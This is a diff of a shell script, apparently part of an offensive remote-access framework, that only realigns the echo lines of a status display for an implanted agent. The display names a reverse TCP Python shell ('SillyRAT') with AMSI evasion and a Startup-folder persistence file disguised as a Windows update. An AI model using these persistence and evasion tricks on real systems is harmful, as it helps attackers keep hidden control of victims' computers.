@@ -42,16 +42,16 @@ fi
 ## Persistence Info Function
 sh_Info () {
 echo ""${BlueF}
-echo "    Id           : $ID"
-echo "    LPORT        : $LPORT"
-echo "    LHOST        : $LHOST"
-echo "    ACTIVE ON    : ${RedF}$FIRST_ACCESS${BlueF}"
-echo "    LAST ACCESS  : ${CyanF}$LAST_ACCESS${BlueF}"
-echo "    DROPPERNAME  : $DROPPER"
-echo "    CATEGORIE    : Amsi Evasion (agent nº6)"
-echo "    DESCRIPTION  : Reverse TCP python Shell (SillyRAT)"
-echo "    AGENT RPATH  : $RPATH"
-echo "    PERSISTENCE  : %appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147.update.bat"
+echo "    Id          : $ID"
+echo "    LPORT       : $LPORT"
+echo "    LHOST       : $LHOST"
+echo "    ACTIVE ON   : ${RedF}$FIRST_ACCESS${BlueF}"
+echo "    LAST ACCESS : ${CyanF}$LAST_ACCESS${BlueF}"
+echo "    DROPPERNAME : $DROPPER"
+echo "    CATEGORIE   : Amsi Evasion (agent nº6)"
+echo "    DESCRIPTION : Reverse TCP python Shell (SillyRAT)"
+echo "    AGENT RPATH : $RPATH"
+echo "    PERSISTENCE : %appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147.update.bat"
 echo "" && echo ${BlueF}:Press ${YellowF}"'ENTER'"${BlueF} to continue ..${Reset}
 read op
 cls
